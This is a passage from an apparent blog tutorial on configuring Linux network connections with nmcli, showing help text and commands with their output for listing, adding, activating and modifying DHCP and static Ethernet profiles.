</span><span class='line'>  up [[id | uuid | path] &lt;ID&gt;] [ifname &lt;ifname&gt;] [ap &lt;BSSID&gt;] [passwd-file &lt;file with passwords&gt;]
</span><span class='line'>
</span><span class='line'>  down [id | uuid | path | apath] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  add COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+]
</span><span class='line'>
</span><span class='line'>  modify [--temporary] [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>  clone [--temporary] [id | uuid | path ] &lt;ID&gt; &lt;new name&gt;
</span><span class='line'>
</span><span class='line'>  edit [id | uuid | path] &lt;ID&gt;
</span><span class='line'>  edit [type &lt;new_con_type&gt;] [con-name &lt;new_con_name&gt;]
</span><span class='line'>
</span><span class='line'>  delete [id | uuid | path] &lt;ID&gt;
</span><span class='line'>
</span><span class='line'>  monitor [id | uuid | path] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  reload
</span><span class='line'>
</span><span class='line'>  load &lt;filename&gt; [ &lt;filename&gt;... ]
</span><span class='line'>
</span><span class='line'>  import [--temporary] type &lt;type&gt; file &lt;file to import&gt;
</span><span class='line'>
</span><span class='line'>  export [id | uuid | path] &lt;ID&gt; [&lt;output file&gt;] </span></code></pre></td></tr></table></div></figure>


<ul>
<li>look at the available connections and list only the active ones</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show
</span><span class='line'>NAME                UUID                                  TYPE            DEVICE 
</span><span class='line'>Wired connection 1  8d922966-5be4-4633-a99d-71e836e2b31a  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0              321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 
</span><span class='line'>enp0s3              b4c32cc7-c5ff-451c-8af2-9b9124050f99  802-3-ethernet  --  
</span><span class='line'>nmcli con show --active
</span><span class='line'>NAME                UUID                                  TYPE            DEVICE 
</span><span class='line'>Wired connection 1  8d922966-5be4-4633-a99d-71e836e2b31a  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0              321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list the settings of a particular connection (the double quotes aren&rsquo;t mandatory)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show "Wired connection 1" 
</span><span class='line'>connection.id:                          Wired connection 1
</span><span class='line'>connection.uuid:                        8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>connection.stable-id:                   --
</span><span class='line'>connection.interface-name:              --
</span><span class='line'>connection.type:                        802-3-ethernet
</span><span class='line'>connection.autoconnect:                 yes
</span><span class='line'>connection.autoconnect-priority:        0
</span><span class='line'>connection.timestamp:                   1515583502
</span><span class='line'>connection.read-only:                   no
</span><span class='line'>connection.permissions:                 
</span><span class='line'>connection.zone:                        --
</span><span class='line'>connection.master:                      --
</span><span class='line'>connection.slave-type:                  --
</span><span class='line'>connection.autoconnect-slaves:          -1 (default)
</span><span class='line'>connection.secondaries:                 
</span><span class='line'>connection.gateway-ping-timeout:        0
</span><span class='line'>connection.metered:                     unknown
</span><span class='line'>connection.lldp:                        -1 (default)
</span><span class='line'>802-3-ethernet.port:                    --
</span><span class='line'>802-3-ethernet.speed:                   0
</span><span class='line'>802-3-ethernet.duplex:                  --
</span><span class='line'>802-3-ethernet.auto-negotiate:          yes
</span><span class='line'>802-3-ethernet.mac-address:             00:0C:29:47:D7:A8
</span><span class='line'>802-3-ethernet.cloned-mac-address:      --
</span><span class='line'>802-3-ethernet.generate-mac-address-mask:--
</span><span class='line'>802-3-ethernet.mac-address-blacklist:   
</span><span class='line'>802-3-ethernet.mtu:                     auto
</span><span class='line'>802-3-ethernet.s390-subchannels:        
</span><span class='line'>802-3-ethernet.s390-nettype:            --
</span><span class='line'>802-3-ethernet.s390-options:            
</span><span class='line'>802-3-ethernet.wake-on-lan:             1 (default)
</span><span class='line'>802-3-ethernet.wake-on-lan-password:    --
</span><span class='line'>ipv4.method:                            auto
</span><span class='line'>ipv4.dns:                               8.8.8.8
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>ipv4.addresses:                         
</span><span class='line'>ipv4.gateway:                           --
</span><span class='line'>ipv4.routes:                            
</span><span class='line'>ipv4.route-metric:                      -1
</span><span class='line'>ipv4.ignore-auto-routes:                no
</span><span class='line'>ipv4.ignore-auto-dns:                   no
</span><span class='line'>ipv4.dhcp-client-id:                    --
</span><span class='line'>ipv4.dhcp-timeout:                      0
</span><span class='line'>ipv4.dhcp-send-hostname:                yes
</span><span class='line'>ipv4.dhcp-hostname:                     --
</span><span class='line'>ipv4.dhcp-fqdn:                         --
</span><span class='line'>ipv4.never-default:                     no
</span><span class='line'>ipv4.may-fail:                          yes
</span><span class='line'>ipv4.dad-timeout:                       -1 (default)
</span><span class='line'>ipv6.method:                            auto
</span><span class='line'>ipv6.dns:                               
</span><span class='line'>ipv6.dns-search:                        
</span><span class='line'>ipv6.dns-options:                       (default)
</span><span class='line'>ipv6.dns-priority:                      0
</span><span class='line'>ipv6.addresses:                         
</span><span class='line'>ipv6.gateway:                           --
</span><span class='line'>ipv6.routes:                            
</span><span class='line'>ipv6.route-metric:                      -1
</span><span class='line'>ipv6.ignore-auto-routes:                no
</span><span class='line'>ipv6.ignore-auto-dns:                   no
</span><span class='line'>ipv6.never-default:                     no
</span><span class='line'>ipv6.may-fail:                          yes
</span><span class='line'>ipv6.ip6-privacy:                       -1 (unknown)
</span><span class='line'>ipv6.addr-gen-mode:                     stable-privacy
</span><span class='line'>ipv6.dhcp-send-hostname:                yes
</span><span class='line'>ipv6.dhcp-hostname:                     --
</span><span class='line'>ipv6.token:                             --
</span><span class='line'>GENERAL.NAME:                           Wired connection 1
</span><span class='line'>GENERAL.UUID:                           8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>GENERAL.DEVICES:                        enp0s3
</span><span class='line'>GENERAL.STATE:                          activated
</span><span class='line'>GENERAL.DEFAULT:                        yes
</span><span class='line'>GENERAL.DEFAULT6:                       no
</span><span class='line'>GENERAL.VPN:                            no
</span><span class='line'>GENERAL.ZONE:                           --
</span><span class='line'>GENERAL.DBUS-PATH:                      /org/freedesktop/NetworkManager/ActiveConnection/0
</span><span class='line'>GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/Settings/0
</span><span class='line'>GENERAL.SPEC-OBJECT:                    /
</span><span class='line'>GENERAL.MASTER-PATH:                    --
</span><span class='line'>IP4.ADDRESS[1]:                         192.168.241.130/24
</span><span class='line'>IP4.GATEWAY:                            192.168.241.2
</span><span class='line'>IP4.DNS[1]:                             192.168.241.2
</span><span class='line'>IP4.DNS[2]:                             8.8.8.8
</span><span class='line'>IP4.DOMAIN[1]:                          localdomain
</span><span class='line'>DHCP4.OPTION[1]:                        requested_routers = 1
</span><span class='line'>DHCP4.OPTION[2]:                        requested_domain_search = 1
</span><span class='line'>DHCP4.OPTION[3]:                        requested_time_offset = 1
</span><span class='line'>DHCP4.OPTION[4]:                        requested_domain_name = 1
</span><span class='line'>DHCP4.OPTION[5]:                        requested_rfc3442_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[6]:                        requested_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[7]:                        requested_wpad = 1
</span><span class='line'>DHCP4.OPTION[8]:                        requested_broadcast_address = 1
</span><span class='line'>DHCP4.OPTION[9]:                        next_server = 192.168.241.254
</span><span class='line'>DHCP4.OPTION[10]:                       expiry = 1515584826
</span><span class='line'>DHCP4.OPTION[11]:                       requested_interface_mtu = 1
</span><span class='line'>DHCP4.OPTION[12]:                       requested_subnet_mask = 1
</span><span class='line'>DHCP4.OPTION[13]:                       domain_name = localdomain
</span><span class='line'>DHCP4.OPTION[14]:                       dhcp_message_type = 5
</span><span class='line'>DHCP4.OPTION[15]:                       ip_address = 192.168.241.130
</span><span class='line'>DHCP4.OPTION[16]:                       routers = 192.168.241.2
</span><span class='line'>DHCP4.OPTION[17]:                       requested_static_routes = 1
</span><span class='line'>DHCP4.OPTION[18]:                       subnet_mask = 255.255.255.0
</span><span class='line'>DHCP4.OPTION[19]:                       requested_domain_name_servers = 1
</span><span class='line'>DHCP4.OPTION[20]:                       requested_nis_servers = 1
</span><span class='line'>DHCP4.OPTION[21]:                       requested_ntp_servers = 1
</span><span class='line'>DHCP4.OPTION[22]:                       domain_name_servers = 192.168.241.2
</span><span class='line'>DHCP4.OPTION[23]:                       dhcp_lease_time = 1800
</span><span class='line'>DHCP4.OPTION[24]:                       requested_ms_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[25]:                       broadcast_address = 192.168.241.255
</span><span class='line'>DHCP4.OPTION[26]:                       requested_nis_domain = 1
</span><span class='line'>DHCP4.OPTION[27]:                       network_number = 192.168.241.0
</span><span class='line'>DHCP4.OPTION[28]:                       requested_host_name = 1
</span><span class='line'>DHCP4.OPTION[29]:                       dhcp_server_identifier = 192.168.241.254
</span><span class='line'>IP6.ADDRESS[1]:                         fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>IP6.GATEWAY:                            </span></code></pre></td></tr></table></div></figure>


<ul>
<li>adding connections</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add help
</span><span class='line'>Usage: nmcli connection add { ARGUMENTS | help }
</span><span class='line'>
</span><span class='line'>ARGUMENTS := COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+]
</span><span class='line'>
</span><span class='line'>  COMMON_OPTIONS:
</span><span class='line'>                  type &lt;type&gt;
</span><span class='line'>                  ifname &lt;interface name&gt; | "*"
</span><span class='line'>                  [con-name &lt;connection name&gt;]
</span><span class='line'>                  [autoconnect yes|no]
</span><span class='line'>                  [save yes|no]
</span><span class='line'>                  [master &lt;master (ifname, or connection UUID or name)&gt;]
</span><span class='line'>                  [slave-type &lt;master connection type&gt;]
</span><span class='line'>
</span><span class='line'>  TYPE_SPECIFIC_OPTIONS:
</span><span class='line'>    ethernet:     [mac &lt;MAC address&gt;]
</span><span class='line'>                  [cloned-mac &lt;cloned MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>
</span><span class='line'>    wifi:         ssid &lt;SSID&gt;
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>                  [cloned-mac &lt;cloned MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [mode infrastructure|ap|adhoc]
</span><span class='line'>
</span><span class='line'>    wimax:        [mac &lt;MAC address&gt;]
</span><span class='line'>                  [nsp &lt;NSP&gt;]
</span><span class='line'>
</span><span class='line'>    pppoe:        username &lt;PPPoE username&gt;
</span><span class='line'>                  [password &lt;PPPoE password&gt;]
</span><span class='line'>                  [service &lt;PPPoE service name&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    gsm:          apn &lt;APN&gt;
</span><span class='line'>                  [user &lt;username&gt;]
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>    cdma:         [user &lt;username&gt;]
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>    infiniband:   [mac &lt;MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [transport-mode datagram | connected]
</span><span class='line'>                  [parent &lt;ifname&gt;]
</span><span class='line'>                  [p-key &lt;IPoIB P_Key&gt;]
</span><span class='line'>
</span><span class='line'>    bluetooth:    [addr &lt;bluetooth address&gt;]
</span><span class='line'>                  [bt-type panu|dun-gsm|dun-cdma]
</span><span class='line'>
</span><span class='line'>    vlan:         dev &lt;parent device (connection UUID, ifname, or MAC)&gt;
</span><span class='line'>                  id &lt;VLAN ID&gt;
</span><span class='line'>                  [flags &lt;VLAN flags&gt;]
</span><span class='line'>                  [ingress &lt;ingress priority mapping&gt;]
</span><span class='line'>                  [egress &lt;egress priority mapping&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>
</span><span class='line'>    bond:         [mode balance-rr (0) | active-backup (1) | balance-xor (2) | broadcast (3) |
</span><span class='line'>                        802.3ad    (4) | balance-tlb   (5) | balance-alb (6)]
</span><span class='line'>                  [primary &lt;ifname&gt;]
</span><span class='line'>                  [miimon &lt;num&gt;]
</span><span class='line'>                  [downdelay &lt;num&gt;]
</span><span class='line'>                  [updelay &lt;num&gt;]
</span><span class='line'>                  [arp-interval &lt;num&gt;]
</span><span class='line'>                  [arp-ip-target &lt;num&gt;]
</span><span class='line'>                  [lacp-rate slow (0) | fast (1)]
</span><span class='line'>
</span><span class='line'>    bond-slave:   master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>
</span><span class='line'>    team:         [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>    team-slave:   master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>                  [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>    bridge:       [stp yes|no]
</span><span class='line'>                  [priority &lt;num&gt;]
</span><span class='line'>                  [forward-delay &lt;2-30&gt;]
</span><span class='line'>                  [hello-time &lt;1-10&gt;]
</span><span class='line'>                  [max-age &lt;6-40&gt;]
</span><span class='line'>                  [ageing-time &lt;0-1000000&gt;]
</span><span class='line'>                  [multicast-snooping yes|no]
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    bridge-slave: master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>                  [priority &lt;0-63&gt;]
</span><span class='line'>                  [path-cost &lt;1-65535&gt;]
</span><span class='line'>                  [hairpin yes|no]
</span><span class='line'>
</span><span class='line'>    vpn:          vpn-type vpnc|openvpn|pptp|openconnect|openswan|libreswan|ssh|l2tp|iodine|...
</span><span class='line'>                  [user &lt;username&gt;]
</span><span class='line'>
</span><span class='line'>    olpc-mesh:    ssid &lt;SSID&gt;
</span><span class='line'>                  [channel &lt;1-13&gt;]
</span><span class='line'>                  [dhcp-anycast &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    adsl:         username &lt;username&gt;
</span><span class='line'>                  protocol pppoa|pppoe|ipoatm
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>                  [encapsulation vcmux|llc]
</span><span class='line'>
</span><span class='line'>    tun:          mode tun|tap
</span><span class='line'>                  [owner &lt;UID&gt;]
</span><span class='line'>                  [group &lt;GID&gt;]
</span><span class='line'>                  [pi yes|no]
</span><span class='line'>                  [vnet-hdr yes|no]
</span><span class='line'>                  [multi-queue yes|no]
</span><span class='line'>
</span><span class='line'>    ip-tunnel:    mode ipip|gre|sit|isatap|vti|ip6ip6|ipip6|ip6gre|vti6
</span><span class='line'>                  remote &lt;remote endpoint IP&gt;
</span><span class='line'>                  [local &lt;local endpoint IP&gt;]
</span><span class='line'>                  [dev &lt;parent device (ifname or connection UUID)&gt;]
</span><span class='line'>
</span><span class='line'>    macvlan:      dev &lt;parent device (connection UUID, ifname, or MAC)&gt;
</span><span class='line'>                  mode vepa|bridge|private|passthru|source
</span><span class='line'>                  [tap yes|no]
</span><span class='line'>
</span><span class='line'>    vxlan:        id &lt;VXLAN ID&gt;
</span><span class='line'>                  remote &lt;IP of multicast group or remote address&gt;
</span><span class='line'>                  [local &lt;source IP&gt;]
</span><span class='line'>                  [dev &lt;parent device (ifname or connection UUID)&gt;]
</span><span class='line'>                  [source-port-min &lt;0-65535&gt;]
</span><span class='line'>                  [source-port-max &lt;0-65535&gt;]
</span><span class='line'>                  [destination-port &lt;0-65535&gt;]
</span><span class='line'>
</span><span class='line'>  SLAVE_OPTIONS:
</span><span class='line'>    bridge:       [priority &lt;0-63&gt;]
</span><span class='line'>                  [path-cost &lt;1-65535&gt;]
</span><span class='line'>                  [hairpin yes|no]
</span><span class='line'>
</span><span class='line'>    team:         [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>  IP_OPTIONS:
</span><span class='line'>                  [ip4 &lt;IPv4 address&gt;] [gw4 &lt;IPv4 gateway&gt;]
</span><span class='line'>                  [ip6 &lt;IPv6 address&gt;] [gw6 &lt;IPv6 gateway&gt;]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a new DHCP connection that will start on boot</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add con-name newdhcp type ethernet ifname enp0s3 
</span><span class='line'>Connection 'newdhcp' (8c90fcd7-5e40-43c6-819b-47cab3051b5e) successfully added.
</span><span class='line'>nmcli con up newdhcp 
</span><span class='line'>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/3)
</span><span class='line'>nmcli con show --active 
</span><span class='line'>NAME     UUID                                  TYPE            DEVICE 
</span><span class='line'>newdhcp  8c90fcd7-5e40-43c6-819b-47cab3051b5e  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0   321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a static connection</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add con-name static-con ifname enp0s3 autoconnect no type ethernet ip4 192.168.241.120/24 gw4 192.168.241.2
</span><span class='line'>Connection 'static-con' (258c2964-ac43-4ed8-bffa-7ad09967b748) successfully added.</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the IP we started with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig | grep inet
</span><span class='line'>        inet 192.168.241.130  netmask 255.255.255.0  broadcast 192.168.241.255</span></code></pre></td></tr></table></div></figure>


<p>And after switching to the static connection:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con up static-con 
</span><span class='line'>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/4)
</span><span class='line'>nmcli con show --active 
</span><span class='line'>NAME        UUID                                  TYPE            DEVICE 
</span><span class='line'>static-con  258c2964-ac43-4ed8-bffa-7ad09967b748  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0      321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 
</span><span class='line'>ifconfig | grep inet
</span><span class='line'>        inet 192.168.241.120  netmask 255.255.255.0  broadcast 192.168.241.255</span></code></pre></td></tr></table></div></figure>


<ul>
<li>modifying connections</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con mod help
</span><span class='line'>Usage: nmcli connection modify { ARGUMENTS | help }
</span><span class='line'>
</span><span class='line'>ARGUMENTS := [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>Modify one or more properties of the connection profile.
</span><span class='line'>The profile is identified by its name, UUID or D-Bus path. For multi-valued
</span><span class='line'>properties you can use optional '+' or '-' prefix to the property name.
</span><span class='line'>The '+' sign allows appending items instead of overwriting the whole value.
</span><span class='line'>The '-' sign allows removing selected items instead of the whole value.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>nmcli con mod home-wifi wifi.ssid rakosnicek
</span><span class='line'>nmcli con mod em1-1 ipv4.method manual ipv4.addr "192.168.1.2/24, 10.10.1.5/8"
</span><span class='line'>nmcli con mod em1-1 +ipv4.dns 8.8.4.4
</span><span class='line'>nmcli con mod em1-1 -ipv4.dns 1
</span><span class='line'>nmcli con mod em1-1 -ipv6.addr "abbe::cafe/56"
</span><span class='line'>nmcli con mod bond0 +bond.options mii=500
</span><span class='line'>nmcli con mod bond0 -bond.options downdelay</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a DNS server to an existing connection</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show static-con | grep ipv4.dns
</span><span class='line'>ipv4.dns:                               
